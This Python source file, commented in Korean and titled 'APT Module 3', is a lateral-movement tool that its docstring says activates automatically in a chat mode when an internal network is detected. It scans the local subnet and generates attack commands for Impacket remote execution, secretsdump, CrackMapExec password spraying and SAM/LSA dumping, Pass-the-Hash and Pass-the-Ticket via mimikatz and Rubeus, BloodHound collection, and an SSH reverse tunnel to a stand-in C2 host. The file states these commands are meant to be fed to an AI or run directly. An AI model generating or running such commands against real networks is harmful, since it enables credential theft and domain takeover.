"""
APT Module 3 — Internal Network Lateral Movement  (v3.5.21)
============================================================
채팅 모드에서 내부망 환경 탐지 시 자동 활성화되는 횡방향 이동 모듈.

기능:
  - SMB 호스트/공유 열거
  - Impacket 기반 원격 실행 명령 자동 생성 (psexec/wmiexec/smbexec/atexec)
  - SSH 횡방향 이동 체인 생성
  - BloodHound/SharpHound 수집 명령 생성
  - WMI 원격 실행 명령 생성
  - PsExec 스타일 실행 페이로드 생성
  - Pass-the-Hash / Pass-the-Ticket 명령 생성
  - 내부 IP 대역 자동 탐지 및 네트워크 매핑

주의: 허가된 레드팀/침투테스트 환경에서만 사용할 것.
"""

from __future__ import annotations

import re
import socket
import subprocess  # noqa: S404
import textwrap
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class LateralTarget:
    ip: str
    hostname: str = ""
    domain: str = ""
    os_hint: str = ""           # "windows" / "linux" / "unknown"
    open_ports: list[int] = field(default_factory=list)
    shares: list[str] = field(default_factory=list)
    is_dc: bool = False


@dataclass
class Credential:
    username: str
    password: str = ""
    nt_hash: str = ""           # NTLM hash
    aes_key: str = ""           # Kerberos AES key
    domain: str = ""
    ticket_path: str = ""       # Kerberos TGT/TGS ccache path


class LateralMovement:
    """
    내부망 횡방향 이동 명령 생성기 및 자동 열거 도구.
    실제 공격 명령을 생성하여 AI에게 제공하거나 직접 실행 가능.
    """

    # ── SMB 관련 포트/서비스 ────────────────────────────────────────────
    SMB_PORTS = [445, 139]
    WMI_PORT = 135
    RPC_PORT = 135
    WINRM_PORTS = [5985, 5986]
    SSH_PORT = 22
    RDPS_PORT = 3389

    def __init__(self, domain: str = "WORKGROUP", dc_ip: str = "") -> None:
        self.domain = domain
        self.dc_ip = dc_ip

    # ── 1. 네트워크 열거 ────────────────────────────────────────────────

    def enumerate_network(self, cidr: str = "", timeout: float = 1.0) -> list[LateralTarget]:
        """
        내부 네트워크 빠른 호스트 발견.
        cidr 미지정 시 현재 머신의 기본 서브넷 사용.
        """
        targets: list[LateralTarget] = []
        if not cidr:
            cidr = self._detect_local_cidr()
        if not cidr:
            return targets

        base_ip = ".".join(cidr.split("/")[0].split(".")[:3])
        for i in range(1, 255):
            ip = f"{base_ip}.{i}"
            if self._is_alive(ip, timeout=timeout):
                open_ports = self._quick_port_scan(ip)
                os_hint = "windows" if 445 in open_ports or 3389 in open_ports else (
                    "linux" if 22 in open_ports else "unknown"
                )
                hostname = self._resolve_hostname(ip)
                is_dc = 88 in open_ports or 389 in open_ports  # Kerberos/LDAP
                targets.append(LateralTarget(
                    ip=ip, hostname=hostname,
                    open_ports=open_ports, os_hint=os_hint, is_dc=is_dc,
                ))
        return targets

    # ── 2. Impacket 명령 생성 ───────────────────────────────────────────

    def generate_impacket_commands(
        self, target: LateralTarget, cred: Credential, command: str = "whoami"
    ) -> dict[str, str]:
        """Impacket 원격 실행 명령 세트 생성."""
        auth = self._build_auth_str(cred)
        return {
            "psexec": (
                f"impacket-psexec {auth} {target.ip} '{command}'"
            ),
            "wmiexec": (
                f"impacket-wmiexec {auth} {target.ip} '{command}'"
            ),
            "smbexec": (
                f"impacket-smbexec {auth} {target.ip} '{command}'"
            ),
            "atexec": (
                f"impacket-atexec {auth} {target.ip} '{command}'"
            ),
            "dcomexec": (
                f"impacket-dcomexec {auth} {target.ip} '{command}'"
            ),
            "secretsdump": (
                f"impacket-secretsdump {auth} {target.ip}"
            ),
        }

    def generate_crackmapexec_commands(
        self, target: LateralTarget, cred: Credential, command: str = "whoami"
    ) -> dict[str, str]:
        """CrackMapExec 명령 세트 생성."""
        auth = self._build_cme_auth(cred)
        return {
            "smb_exec": (
                f"crackmapexec smb {target.ip} {auth} -x '{command}'"
            ),
            "smb_shell": (
                f"crackmapexec smb {target.ip} {auth} --shares"
            ),
            "winrm_exec": (
                f"crackmapexec winrm {target.ip} {auth} -x '{command}'"
            ),
            "spray": (
                f"crackmapexec smb {target.ip}/24 {auth} --continue-on-success"
            ),
            "dump_lsa": (
                f"crackmapexec smb {target.ip} {auth} --lsa"
            ),
            "dump_sam": (
                f"crackmapexec smb {target.ip} {auth} --sam"
            ),
        }

    # ── 3. SSH 횡방향 이동 ──────────────────────────────────────────────

    def generate_ssh_lateral_chain(
        self,
        hops: list[tuple[str, str, str]],   # [(ip, user, key_or_pass), ...]
        final_command: str = "id",
    ) -> str:
        """SSH ProxyJump 기반 다단 이동 명령 생성."""
        if not hops:
            return ""
        if len(hops) == 1:
            ip, user, auth = hops[0]
            return f"ssh -i {auth} {user}@{ip} '{final_command}'"

        # ProxyJump 체인
        jump_hosts = ",".join(f"{user}@{ip}" for ip, user, _ in hops[:-1])
        last_ip, last_user, last_auth = hops[-1]
        return (
            f"ssh -J {jump_hosts} "
            f"-i {last_auth} {last_user}@{last_ip} '{final_command}'"
        )

    def generate_ssh_tunnel(
        self,
        pivot_ip: str,
        pivot_user: str,
        local_port: int,
        remote_ip: str,
        remote_port: int,
    ) -> str:
        """SSH 포트 포워딩 터널 명령 생성."""
        return textwrap.dedent(f"""\
            # 로컬 포트 포워딩 (Local → Remote)
            ssh -L {local_port}:{remote_ip}:{remote_port} {pivot_user}@{pivot_ip} -N -f

            # 동적 SOCKS5 프록시
            ssh -D 1080 {pivot_user}@{pivot_ip} -N -f
            # 이후 proxychains4 또는 --proxy socks5://127.0.0.1:1080 사용

            # 리버스 터널 (피벗 → 공격자)
            ssh -R {local_port}:{remote_ip}:{remote_port} attacker@your-c2.com -N -f
        """)

    # ── 4. BloodHound 수집 ──────────────────────────────────────────────

    def generate_bloodhound_commands(self) -> dict[str, str]:
        """BloodHound/SharpHound AD 수집 명령 생성."""
        dc = self.dc_ip or "DC-IP"
        domain = self.domain or "DOMAIN.LOCAL"
        return {
            "bloodhound_python": (
                f"bloodhound-python -d {domain} -ns {dc} "
                f"-c All --zip -u USER -p PASSWORD"
            ),
            "sharphound_powershell": (
                "Invoke-BloodHound -CollectionMethod All -ZipFileName bh.zip"
            ),
            "sharphound_exe": (
                "SharpHound.exe -c All --zipfilename bh.zip "
                f"--domain {domain} --ldapusername USER --ldappassword PASSWORD"
            ),
            "neo4j_import": (
                "# Import ZIP into BloodHound\n"
                "# 1. Start neo4j: neo4j console\n"
                "# 2. Open BloodHound, upload bh.zip\n"
                "# 3. Run: MATCH p=shortestPath((n:User)-[*1..]->(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p"
            ),
        }

    # ── 5. Pass-the-Hash / Pass-the-Ticket ──────────────────────────────

    def generate_pth_commands(
        self, target: LateralTarget, cred: Credential
    ) -> dict[str, str]:
        """Pass-the-Hash 명령 생성."""
        ntlm = cred.nt_hash or "NTLM_HASH_HERE"
        user = cred.username
        domain = cred.domain or self.domain
        return {
            "impacket_pth": (
                f"impacket-psexec {domain}/{user}@{target.ip} "
                f"-hashes :{ntlm}"
            ),
            "evil_winrm_pth": (
                f"evil-winrm -i {target.ip} -u {user} -H {ntlm}"
            ),
            "xfreerdp_pth": (
                f"xfreerdp /v:{target.ip} /u:{user} /pth:{ntlm} /d:{domain}"
            ),
            "mimikatz_pth": (
                f"sekurlsa::pth /user:{user} /domain:{domain} "
                f"/ntlm:{ntlm} /run:cmd.exe"
            ),
        }

    def generate_ptt_commands(self, cred: Credential) -> dict[str, str]:
        """Pass-the-Ticket (Kerberos) 명령 생성."""
        ccache = cred.ticket_path or "/tmp/ticket.ccache"
        return {
            "set_env": f"export KRB5CCNAME={ccache}",
            "impacket_ptt": (
                f"KRB5CCNAME={ccache} impacket-psexec "
                f"{self.domain}/{cred.username}@target.{self.domain} -k -no-pass"
            ),
            "rubeus_ptt": (
                "Rubeus.exe ptt /ticket:<base64-ticket>"
            ),
        }

    # ── 6. 요약 보고서 ──────────────────────────────────────────────────

    def format_targets_report(
        self, targets: list[LateralTarget], lang: str = "en"
    ) -> str:
        """발견된 타겟 보고서."""
        if not targets:
            return "No live hosts found."
        lines = ["━" * 60,
                 f"🌐 Internal Network Scan — {len(targets)} live host(s)",
                 "━" * 60]
        for t in targets:
            dc_tag = " [DC]" if t.is_dc else ""
            hostname = f" ({t.hostname})" if t.hostname else ""
            lines.append(
                f"  {'🏛' if t.is_dc else '💻'} {t.ip}{hostname}{dc_tag}"
                f"  OS:{t.os_hint.upper()}  ports:{t.open_ports[:8]}"
            )
        lines.append("━" * 60)
        return "\n".join(lines)

    # ── 내부 헬퍼 ───────────────────────────────────────────────────────

    def _build_auth_str(self, cred: Credential) -> str:
        domain = cred.domain or self.domain or "."
        if cred.nt_hash:
            return f"{domain}/{cred.username} -hashes :{cred.nt_hash}"
        return f"{domain}/{cred.username}:{cred.password or 'PASSWORD'}"

    def _build_cme_auth(self, cred: Credential) -> str:
        domain = cred.domain or self.domain or "."
        if cred.nt_hash:
            return f"-u {cred.username} -H {cred.nt_hash} -d {domain}"
        return f"-u {cred.username} -p '{cred.password or 'PASSWORD'}' -d {domain}"

    def _detect_local_cidr(self) -> str:
        """현재 머신의 로컬 서브넷 추측."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            parts = ip.rsplit(".", 1)
            return f"{parts[0]}.0/24"
        except Exception:
            return ""

    def _is_alive(self, ip: str, timeout: float = 0.5) -> bool:
        """ICMP ping 없이 TCP 연결로 호스트 생존 확인."""
        for port in [80, 443, 22, 445, 3389]:
            try:
                s = socket.socket()
                s.settimeout(timeout)
                s.connect((ip, port))
                s.close()
                return True
            except Exception:
                pass
        return False

    def _quick_port_scan(self, ip: str) -> list[int]:
        """주요 포트 빠른 스캔."""
        check = [21, 22, 23, 25, 53, 80, 88, 110, 135, 139, 143,
                 389, 443, 445, 464, 636, 1433, 3306, 3389, 5432,
                 5985, 5986, 8080, 8443, 9200]
        open_ports = []
        for port in check:
            try:
                s = socket.socket()
                s.settimeout(0.3)
                s.connect((ip, port))
                s.close()
                open_ports.append(port)
            except Exception:
                pass
        return open_ports

    def _resolve_hostname(self, ip: str) -> str:
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return ""


# ── 빠른 명령 생성 유틸리티 ─────────────────────────────────────────────

def quick_lateral_commands(
    target_ip: str,
    username: str,
    password: str = "",
    nt_hash: str = "",
    domain: str = "WORKGROUP",
) -> str:
    """원라이너 횡방향 이동 명령 생성."""
    lm = LateralMovement(domain=domain)
    target = LateralTarget(ip=target_ip)
    cred = Credential(username=username, password=password, nt_hash=nt_hash, domain=domain)

    impacket = lm.generate_impacket_commands(target, cred)
    cme = lm.generate_crackmapexec_commands(target, cred)

    lines = [
        "━" * 60,
        f"🔀 Lateral Movement Commands → {target_ip} ({domain}\\{username})",
        "━" * 60,
        "## Impacket",
    ]
    for k, v in impacket.items():
        lines.append(f"  [{k}] {v}")
    lines.append("\n## CrackMapExec")
    for k, v in cme.items():
        lines.append(f"  [{k}] {v}")
    lines.append("━" * 60)
    return "\n".join(lines)
